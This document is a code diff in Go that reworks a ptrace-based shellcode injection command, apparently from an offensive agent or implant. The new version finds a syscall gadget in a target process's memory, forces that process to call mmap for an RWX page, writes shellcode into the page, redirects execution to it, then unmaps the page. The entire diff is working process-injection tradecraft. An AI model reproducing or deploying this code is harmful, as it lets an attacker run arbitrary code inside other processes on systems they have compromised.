@@ -254,8 +254,8 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	}
 	sb.WriteString(fmt.Sprintf("[+] Saved registers (RIP=0x%X, RSP=0x%X)\n", origRegs.Rip, origRegs.Rsp))
 
-	// Step 3: Find an executable memory region in the target
-	execAddr, regionSize, err := findExecutableRegion(args.PID)
+	// Step 3: Find a syscall gadget in the target process
+	syscallAddr, err := findSyscallGadget(args.PID)
 	if err != nil {
 		_ = syscall.PtraceDetach(args.PID)
 		return structs.CommandResult{
@@ -264,54 +264,105 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 			Completed: true,
 		}
 	}
+	sb.WriteString(fmt.Sprintf("[+] Found syscall gadget at 0x%X\n", syscallAddr))
 
-	// Append INT3 (0xCC) if we plan to wait for completion
+	// Step 4: Use ptrace syscall injection to call mmap and get an RWX page
+	// mmap(NULL, pagesize, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
+	pageSize := uint64(4096)
+	scSize := uint64(len(shellcode))
+	if restore {
+		scSize++ // room for INT3
+	}
+	if scSize > pageSize {
+		pageSize = ((scSize + 4095) / 4096) * 4096
+	}
+
+	var mmapRegs syscall.PtraceRegs
+	mmapRegs = origRegs
+	mmapRegs.Rip = syscallAddr
+	mmapRegs.Rax = 9                      // SYS_mmap
+	mmapRegs.Rdi = 0                      // addr = NULL (kernel chooses)
+	mmapRegs.Rsi = pageSize               // length
+	mmapRegs.Rdx = 7                      // PROT_READ|PROT_WRITE|PROT_EXEC
+	mmapRegs.R10 = 0x22                   // MAP_PRIVATE|MAP_ANONYMOUS
+	mmapRegs.R8 = 0xffffffffffffffff      // fd = -1
+	mmapRegs.R9 = 0                       // offset = 0
+
+	if err := syscall.PtraceSetRegs(args.PID, &mmapRegs); err != nil {
+		_ = syscall.PtraceDetach(args.PID)
+		return structs.CommandResult{
+			Output:    sb.String() + fmt.Sprintf("[!] Failed to set mmap registers: %v\n", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Single-step to execute the syscall instruction
+	if err := syscall.PtraceSingleStep(args.PID); err != nil {
+		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
+		_ = syscall.PtraceDetach(args.PID)
+		return structs.CommandResult{
+			Output:    sb.String() + fmt.Sprintf("[!] PTRACE_SINGLESTEP failed: %v\n", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	if _, err := syscall.Wait4(args.PID, &ws, 0, nil); err != nil {
+		_ = syscall.PtraceDetach(args.PID)
+		return structs.CommandResult{
+			Output:    sb.String() + fmt.Sprintf("[!] Wait4 after mmap failed: %v\n", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Read the mmap return value from RAX
+	if err := syscall.PtraceGetRegs(args.PID, &mmapRegs); err != nil {
+		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
+		_ = syscall.PtraceDetach(args.PID)
+		return structs.CommandResult{
+			Output:    sb.String() + fmt.Sprintf("[!] Failed to read mmap result: %v\n", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	rwxAddr := mmapRegs.Rax
+	// mmap returns MAP_FAILED (-1 as unsigned) on error
+	if rwxAddr >= 0xfffffffffffff000 {
+		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
+		_ = syscall.PtraceDetach(args.PID)
+		return structs.CommandResult{
+			Output:    sb.String() + fmt.Sprintf("[!] mmap failed (returned 0x%X)\n", rwxAddr),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	sb.WriteString(fmt.Sprintf("[+] mmap allocated RWX page at 0x%X (%d bytes)\n", rwxAddr, pageSize))
+
+	// Step 5: Build injection code — shellcode + optional INT3 trailer
 	injectionCode := make([]byte, len(shellcode))
 	copy(injectionCode, shellcode)
 	if restore {
-		injectionCode = append(injectionCode, 0xCC)
+		injectionCode = append(injectionCode, 0xCC) // INT3 to signal completion
 	}
 
-	if uint64(len(injectionCode)) > regionSize {
+	// Step 6: Write shellcode to the RWX page
+	if _, err := syscall.PtracePokeText(args.PID, uintptr(rwxAddr), injectionCode); err != nil {
+		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
 		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] Shellcode (%d bytes) exceeds region size (%d bytes)\n", len(injectionCode), regionSize),
+			Output:    sb.String() + fmt.Sprintf("[!] Failed to write shellcode to RWX page: %v\n", err),
 			Status:    "error",
 			Completed: true,
 		}
 	}
-	sb.WriteString(fmt.Sprintf("[+] Using executable region at 0x%X (%d bytes available)\n", execAddr, regionSize))
+	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes at 0x%X\n", len(injectionCode), rwxAddr))
 
-	// Step 4: Backup original code at injection point
-	origCode := make([]byte, len(injectionCode))
-	if _, err := syscall.PtracePeekText(args.PID, uintptr(execAddr), origCode); err != nil {
-		_ = syscall.PtraceDetach(args.PID)
-		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] Failed to read original code: %v\n", err),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-	sb.WriteString(fmt.Sprintf("[+] Backed up %d bytes of original code\n", len(origCode)))
-
-	// Step 5: Write shellcode using PTRACE_POKETEXT
-	if _, err := syscall.PtracePokeText(args.PID, uintptr(execAddr), injectionCode); err != nil {
-		// Attempt to restore original code before detaching
-		_, _ = syscall.PtracePokeText(args.PID, uintptr(execAddr), origCode)
-		_ = syscall.PtraceDetach(args.PID)
-		return structs.CommandResult{
-			Output:    sb.String() + fmt.Sprintf("[!] Failed to write shellcode: %v\n", err),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes at 0x%X\n", len(injectionCode), execAddr))
-
-	// Step 6: Set RIP to the shellcode
+	// Step 7: Set RIP to the shellcode in the RWX page
 	newRegs := origRegs
-	newRegs.Rip = execAddr
+	newRegs.Rip = rwxAddr
 	if err := syscall.PtraceSetRegs(args.PID, &newRegs); err != nil {
-		_, _ = syscall.PtracePokeText(args.PID, uintptr(execAddr), origCode)
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
 		return structs.CommandResult{
@@ -320,12 +371,11 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 			Completed: true,
 		}
 	}
-	sb.WriteString(fmt.Sprintf("[+] Set RIP to 0x%X\n", execAddr))
+	sb.WriteString(fmt.Sprintf("[+] Set RIP to 0x%X\n", rwxAddr))
 
-	// Step 7: Continue execution
+	// Step 8: Continue execution
 	sb.WriteString("[*] Continuing execution...\n")
 	if err := syscall.PtraceCont(args.PID, 0); err != nil {
-		_, _ = syscall.PtracePokeText(args.PID, uintptr(execAddr), origCode)
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
 		return structs.CommandResult{
@@ -336,8 +386,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	}
 
 	if restore {
-		// Step 8: Wait for INT3 (SIGTRAP) with timeout using WNOHANG polling
-		// Wait4 must be called from the same OS thread as PtraceAttach
+		// Step 9: Wait for INT3 (SIGTRAP) with timeout
 		deadline := time.Now().Add(time.Duration(timeout) * time.Second)
 		stopped := false
 		for time.Now().Before(deadline) {
@@ -370,14 +419,21 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 			sb.WriteString(fmt.Sprintf("[*] Process stopped with signal %d\n", ws.StopSignal()))
 		}
 
-		// Step 9: Restore original code
-		if _, err := syscall.PtracePokeText(args.PID, uintptr(execAddr), origCode); err != nil {
-			sb.WriteString(fmt.Sprintf("[!] Failed to restore code: %v\n", err))
-		} else {
-			sb.WriteString("[+] Restored original code\n")
+		// Step 10: Clean up — munmap the RWX page
+		var munmapRegs syscall.PtraceRegs
+		munmapRegs = origRegs
+		munmapRegs.Rip = syscallAddr
+		munmapRegs.Rax = 11           // SYS_munmap
+		munmapRegs.Rdi = rwxAddr      // addr
+		munmapRegs.Rsi = pageSize     // length
+		if err := syscall.PtraceSetRegs(args.PID, &munmapRegs); err == nil {
+			if err := syscall.PtraceSingleStep(args.PID); err == nil {
+				_, _ = syscall.Wait4(args.PID, &ws, 0, nil)
+				sb.WriteString("[+] Cleaned up RWX page (munmap)\n")
+			}
 		}
 
-		// Step 10: Restore original registers
+		// Step 11: Restore original registers
 		if err := syscall.PtraceSetRegs(args.PID, &origRegs); err != nil {
 			sb.WriteString(fmt.Sprintf("[!] Failed to restore registers: %v\n", err))
 		} else {
@@ -385,7 +441,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 		}
 	}
 
-	// Step 11: Detach
+	// Step 12: Detach
 	if err := syscall.PtraceDetach(args.PID); err != nil {
 		sb.WriteString(fmt.Sprintf("[!] PTRACE_DETACH failed: %v\n", err))
 	} else {
@@ -401,53 +457,74 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	}
 }
 
-// findExecutableRegion finds an r-xp memory region in the target process.
-// Returns the start address and size of the region.
-func findExecutableRegion(pid int) (uint64, uint64, error) {
+// findSyscallGadget scans r-xp memory regions for a syscall instruction (0x0F 0x05).
+// Uses /proc/<pid>/mem for reading, which works on both self and ptrace-attached processes.
+func findSyscallGadget(pid int) (uint64, error) {
 	mapsPath := fmt.Sprintf("/proc/%d/maps", pid)
 	data, err := os.ReadFile(mapsPath)
 	if err != nil {
-		return 0, 0, fmt.Errorf("cannot read %s: %v", mapsPath, err)
+		return 0, fmt.Errorf("cannot read %s: %v", mapsPath, err)
 	}
+
+	memPath := fmt.Sprintf("/proc/%d/mem", pid)
+	memFile, err := os.Open(memPath)
+	if err != nil {
+		return 0, fmt.Errorf("cannot open %s: %v", memPath, err)
+	}
+	defer memFile.Close()
 
 	for _, line := range strings.Split(string(data), "\n") {
 		if line == "" {
 			continue
 		}
-		// Format: start-end perms offset dev inode pathname
-		// e.g.: 7f1234560000-7f1234561000 r-xp 00000000 08:01 12345 /lib/x86_64-linux-gnu/libc.so.6
 		parts := strings.Fields(line)
 		if len(parts) < 2 {
 			continue
 		}
 
 		perms := parts[1]
-		// Look for r-xp (readable + executable + private)
-		if len(perms) >= 4 && perms[0] == 'r' && perms[2] == 'x' {
-			// Skip vdso and vsyscall — they have special protections
-			if len(parts) >= 6 {
-				name := parts[len(parts)-1]
-				if strings.Contains(name, "vdso") || strings.Contains(name, "vsyscall") {
-					continue
-				}
+		if len(perms) < 4 || perms[0] != 'r' || perms[2] != 'x' {
+			continue
+		}
+		// Skip vdso/vsyscall
+		if len(parts) >= 6 {
+			name := parts[len(parts)-1]
+			if strings.Contains(name, "vdso") || strings.Contains(name, "vsyscall") {
+				continue
 			}
+		}
 
-			addrParts := strings.Split(parts[0], "-")
-			if len(addrParts) != 2 {
-				continue
+		addrParts := strings.Split(parts[0], "-")
+		if len(addrParts) != 2 {
+			continue
+		}
+		var startAddr, endAddr uint64
+		if _, err := fmt.Sscanf(addrParts[0], "%x", &startAddr); err != nil {
+			continue
+		}
+		if _, err := fmt.Sscanf(addrParts[1], "%x", &endAddr); err != nil {
+			continue
+		}
+
+		// Scan this region for syscall instruction (0x0F 0x05)
+		chunkSize := uint64(4096)
+		buf := make([]byte, chunkSize)
+		for addr := startAddr; addr < endAddr-1; addr += chunkSize {
+			readSize := chunkSize
+			if addr+readSize > endAddr {
+				readSize = endAddr - addr
 			}
-			var startAddr, endAddr uint64
-			if _, err := fmt.Sscanf(addrParts[0], "%x", &startAddr); err != nil {
-				continue
+			n, err := memFile.ReadAt(buf[:readSize], int64(addr))
+			if err != nil || n < 2 {
+				break
 			}
-			if _, err := fmt.Sscanf(addrParts[1], "%x", &endAddr); err != nil {
-				continue
-			}
-			if endAddr > startAddr {
-				return startAddr, endAddr - startAddr, nil
+			for i := 0; i < n-1; i++ {
+				if buf[i] == 0x0F && buf[i+1] == 0x05 {
+					return addr + uint64(i), nil
+				}
 			}
 		}
 	}
 
-	return 0, 0, fmt.Errorf("no executable region found in process %d", pid)
+	return 0, fmt.Errorf("no syscall gadget found in process %d", pid)
 }
